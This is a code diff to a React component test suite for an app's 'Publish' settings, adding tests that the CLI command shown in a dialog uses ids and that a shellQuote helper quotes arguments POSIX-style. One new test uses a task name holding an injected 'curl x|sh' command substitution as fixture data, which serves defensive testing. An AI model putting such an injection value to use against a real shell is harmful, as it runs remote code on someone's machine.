@@ -17,6 +17,7 @@ import userEvent from "@testing-library/user-event";
 import type { JSX, ReactNode } from "react";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { Connections, Devices, Privacy, Publish, Retention, SettingsLayout } from "./index.ts";
+import { shellQuote } from "./Publish.tsx";
 
 if (typeof window !== "undefined") {
   window.scrollTo = (() => undefined) as typeof window.scrollTo;
@@ -318,7 +319,7 @@ describe("Publish (local mode)", () => {
     await userEvent.click(screen.getByRole("switch", { name: "Publish shop" }));
     const dlg = await screen.findByRole("alertdialog", { name: 'Stop publishing "shop"?' });
     expect(within(dlg).getByText(/copies on https:\/\/cloud.example are deleted/)).toBeTruthy();
-    expect(within(dlg).getByText("pama sync disable --project shop")).toBeTruthy();
+    expect(within(dlg).getByText("pama sync disable --project p1")).toBeTruthy();
     await userEvent.click(within(dlg).getByRole("button", { name: "Stop publishing" }));
     await waitFor(() =>
       expect(sent(fetch, "PATCH", "/v1/projects/p1")).toEqual([{ sync_enabled: false }]),
@@ -334,10 +335,37 @@ describe("Publish (local mode)", () => {
     show(<Publish />);
     await userEvent.click(await screen.findByRole("switch", { name: "Publish task Refunds" }));
     const dlg = await screen.findByRole("alertdialog");
-    expect(within(dlg).getByText("pama sync disable --task Refunds")).toBeTruthy();
+    expect(within(dlg).getByText("pama sync disable --task b1")).toBeTruthy();
     await userEvent.click(within(dlg).getAllByRole("button", { name: "Cancel" })[0] as HTMLElement);
     await waitFor(() => expect(screen.queryByRole("alertdialog")).toBeNull());
     expect(sent(fetch, "PATCH", "/v1/bundles/b1")).toEqual([]);
+  });
+
+  it("names the task by id in the CLI command, never by a name the shell could run", async () => {
+    stubApi([
+      ["/v1/settings/topology", topology("local")],
+      [
+        "/v1/sync/status",
+        {
+          projects: [project({ bundles: [task({ name: "fix $(curl x|sh)" })] })],
+          pending: { digests: 0, tombstones: 0 },
+        },
+      ],
+      ["/v1/sync/source", { target: "https://cloud.example" }],
+    ]);
+    show(<Publish />);
+    await userEvent.click(
+      await screen.findByRole("switch", { name: "Publish task fix $(curl x|sh)" }),
+    );
+    const dlg = await screen.findByRole("alertdialog");
+    expect(within(dlg).getByText("pama sync disable --task b1")).toBeTruthy();
+    expect(within(dlg).queryByText(/curl/, { selector: "code" })).toBeNull();
+  });
+
+  it("quotes shell arguments POSIX-style", () => {
+    expect(shellQuote("b1")).toBe("b1");
+    expect(shellQuote("fix $(x) `y` $HOME")).toBe("'fix $(x) `y` $HOME'");
+    expect(shellQuote("it's")).toBe("'it'\\''s'");
   });
 
   it("says when it is connected but nothing is published, and turns a task on", async () => {
